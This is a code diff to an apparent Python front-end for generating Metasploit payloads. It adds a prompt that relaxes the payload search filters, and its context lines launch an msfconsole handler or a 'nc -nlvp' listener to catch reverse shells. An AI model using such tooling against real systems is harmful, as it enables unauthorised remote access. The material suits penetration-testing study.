@@ -101,7 +101,16 @@ def print_available_payloads(keywords,payload_list):
 	    
 	else:
             print("[!] Sorry, no payload found, please check your inputs / combination")
-            sys.exit(-1)
+            n= input("Do you want to relax filters (O/n) ? : ")
+            if n =="n":
+                sys.exit(-1)
+            else:
+                # Relaxing filter by removing BIND and STAGED items
+                keywords = keywords.replace('bind','').replace('staged','').strip()
+                print("Searching again with : ",  keywords)
+                #test again for results
+                return print_available_payloads(keywords,payload_list)
+                
 
 def generate_payload(params,number,avail_payloads,pname):
     
@@ -146,15 +155,13 @@ def generate_payload(params,number,avail_payloads,pname):
             print(Green("[*] Launching Metasploit ..."))
             # Launch metasploit in another terminal
             # works only in Kali OR OS with Qterminal
-            #subprocess.Popen("qterminal -e 'msfconsole -r listener.rc'", shell= True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-            #subprocess.Popen("qterminal -e 'msfconsole'", shell= True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
             subprocess.call("qterminal -e msfconsole -r listener.rc > /dev/null 2>&1 &", shell=True)
             
         else: # Open netcat shell in another TERM
             msf_cmd = "nc -nlvp {}".format(PORT)
             subprocess.call("qterminal -e '{}' > /dev/null 2>&1 &".format(msf_cmd), shell= True)
 
-            #os.system(msf_cmd)
+            
     return 
 
 
